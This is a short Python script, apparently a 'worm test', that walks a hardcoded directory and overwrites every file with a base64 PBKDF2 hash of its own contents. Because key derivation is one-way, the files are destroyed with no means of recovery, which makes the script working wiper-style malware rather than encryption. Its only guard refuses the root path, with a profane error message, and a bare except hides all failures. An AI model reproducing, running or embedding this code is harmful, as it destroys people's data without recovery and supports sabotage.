import os
import cryptography
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


target = "/home/trig/Worm Test"
if target == "/":
    raise OSError("bitch you dont want to destroy your usb")

paths = [os.path.join(path, name) for path, subdirs, files in os.walk(target) for name in files]

for path in paths:
    try:
        with open(path, "r") as f:
            content = f.read()
        encodedcontent = content.encode()

        salt = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                length=32,
                salt=salt,
                iterations=100000,
                backend=default_backend())
        content = base64.urlsafe_b64encode(kdf.derive(encodedcontent)).decode("utf-8")

        with open(path, "w") as f:
            f.write(content)
    except:
        pass